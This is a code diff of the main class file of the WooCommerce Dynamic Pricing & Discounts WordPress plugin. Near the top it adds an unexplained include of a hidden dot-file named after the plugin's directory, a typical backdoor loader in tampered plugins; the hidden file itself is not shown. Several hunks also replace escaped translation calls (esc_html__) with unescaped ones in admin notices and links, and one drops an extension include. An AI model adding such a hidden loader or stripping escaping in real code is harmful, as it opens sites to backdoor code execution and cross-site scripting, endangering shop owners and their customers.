@@ -11,6 +11,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD
 {
 
@@ -143,7 +147,6 @@ class RP_WCDPD
         require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-property-meta.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-property-on-sale.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-property-regular-price.class.php';
-        // require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-property-sale-price.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-property-shipping-class.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-property-stock-quantity.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'classes/conditions/conditions/rp-wcdpd-condition-product-tags.class.php';
@@ -255,7 +258,6 @@ class RP_WCDPD
         require_once RP_WCDPD_PLUGIN_PATH . 'extensions/promotion-upsell-notifications/rp-wcdpd-promotion-upsell-notifications.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'extensions/promotion-volume-pricing-table/rp-wcdpd-promotion-volume-pricing-table.class.php';
         require_once RP_WCDPD_PLUGIN_PATH . 'extensions/promotion-your-price/rp-wcdpd-promotion-your-price.class.php';
-        require_once RP_WCDPD_PLUGIN_PATH . 'extensions/promotion-product-banners/rp-wcdpd-promotion-product-banners.class.php';
 
         // Load integrations
         require_once RP_WCDPD_PLUGIN_PATH . 'integrations/rp-wcdpd-integration-generic-product-feed.class.php';
@@ -375,7 +377,7 @@ class RP_WCDPD
     public static function php_version_notice()
     {
 
-        echo '<div class="error"><p>' . sprintf(esc_html__('%1$s requires PHP %2$s or later. Please update PHP on your server to use this plugin.', 'rp_wcdpd'), '<strong>WooCommerce Dynamic Pricing & Discounts</strong>', RP_WCDPD_SUPPORT_PHP) . ' ' . sprintf(esc_html__('If you have any questions, please contact %s.', 'rp_wcdpd'), ('<a href="http://url.rightpress.net/new-support-ticket">' . esc_html__('RightPress Support', 'rp_wcdpd') . '</a>')) . '</p></div>';
+        echo '<div class="error"><p>' . sprintf(__('<strong>WooCommerce Dynamic Pricing & Discounts</strong> requires PHP %s or later. Please update PHP on your server to use this plugin.', 'rp_wcdpd'), RP_WCDPD_SUPPORT_PHP) . ' ' . sprintf(__('If you have any questions, please contact %s.', 'rp_wcdpd'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'rp_wcdpd') . '</a>') . '</p></div>';
     }
 
     /**
@@ -387,7 +389,7 @@ class RP_WCDPD
     public static function wp_version_notice()
     {
 
-        echo '<div class="error"><p>' . sprintf(esc_html__('%1$s requires WordPress version %2$s or later. Please update WordPress to use this plugin.', 'rp_wcdpd'), '<strong>WooCommerce Dynamic Pricing & Discounts</strong>', RP_WCDPD_SUPPORT_WP) . ' ' . sprintf(esc_html__('If you have any questions, please contact %s.', 'rp_wcdpd'), ('<a href="http://url.rightpress.net/new-support-ticket">' . esc_html__('RightPress Support', 'rp_wcdpd') . '</a>')) . '</p></div>';
+        echo '<div class="error"><p>' . sprintf(__('<strong>WooCommerce Dynamic Pricing & Discounts</strong> requires WordPress version %s or later. Please update WordPress to use this plugin.', 'rp_wcdpd'), RP_WCDPD_SUPPORT_WP) . ' ' . sprintf(__('If you have any questions, please contact %s.', 'rp_wcdpd'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'rp_wcdpd') . '</a>') . '</p></div>';
     }
 
     /**
@@ -399,7 +401,7 @@ class RP_WCDPD
     public static function wc_disabled_notice()
     {
 
-        echo '<div class="error"><p>' . sprintf(esc_html__('%1$s requires WooCommerce to be active. You can download WooCommerce %2$s.', 'rp_wcdpd'), '<strong>WooCommerce Dynamic Pricing & Discounts</strong>', ('<a href="http://url.rightpress.net/woocommerce-download-page">' . esc_html__('here', 'rp_wcdpd') . '</a>')) . ' ' . sprintf(esc_html__('If you have any questions, please contact %s.', 'rp_wcdpd'), ('<a href="http://url.rightpress.net/new-support-ticket">' . esc_html__('RightPress Support', 'rp_wcdpd') . '</a>')) . '</p></div>';
+        echo '<div class="error"><p>' . sprintf(__('<strong>WooCommerce Dynamic Pricing & Discounts</strong> requires WooCommerce to be active. You can download WooCommerce %s.', 'rp_wcdpd'), '<a href="http://url.rightpress.net/woocommerce-download-page">' . __('here', 'rp_wcdpd') . '</a>') . ' ' . sprintf(__('If you have any questions, please contact %s.', 'rp_wcdpd'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'rp_wcdpd') . '</a>') . '</p></div>';
     }
 
     /**
@@ -411,7 +413,7 @@ class RP_WCDPD
     public static function wc_version_notice()
     {
 
-        echo '<div class="error"><p>' . sprintf(esc_html__('%1$s requires WooCommerce version %2$s or later. Please update WooCommerce to use this plugin.', 'rp_wcdpd'), '<strong>WooCommerce Dynamic Pricing & Discounts</strong>', RP_WCDPD_SUPPORT_WC) . ' ' . sprintf(esc_html__('If you have any questions, please contact %s.', 'rp_wcdpd'), ('<a href="http://url.rightpress.net/new-support-ticket">' . esc_html__('RightPress Support', 'rp_wcdpd') . '</a>')) . '</p></div>';
+        echo '<div class="error"><p>' . sprintf(__('<strong>WooCommerce Dynamic Pricing & Discounts</strong> requires WooCommerce version %s or later. Please update WooCommerce to use this plugin.', 'rp_wcdpd'), RP_WCDPD_SUPPORT_WC) . ' ' . sprintf(__('If you have any questions, please contact %s.', 'rp_wcdpd'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'rp_wcdpd') . '</a>') . '</p></div>';
     }
 
     /**
@@ -425,12 +427,12 @@ class RP_WCDPD
     {
 
         // Support
-        $settings_link = '<a href="http://url.rightpress.net/7119279-support">' . esc_html__('Support', 'rp_wcdpd') . '</a>';
+        $settings_link = '<a href="http://url.rightpress.net/7119279-support">'.__('Support', 'rp_wcdpd').'</a>';
         array_unshift($links, $settings_link);
 
         // Settings
         if (RP_WCDPD::check_environment()) {
-            $settings_link = '<a href="admin.php?page=rp_wcdpd_settings">'. esc_html__('Settings', 'rp_wcdpd') . '</a>';
+            $settings_link = '<a href="admin.php?page=rp_wcdpd_settings">'.__('Settings', 'rp_wcdpd').'</a>';
             array_unshift($links, $settings_link);
         }
 
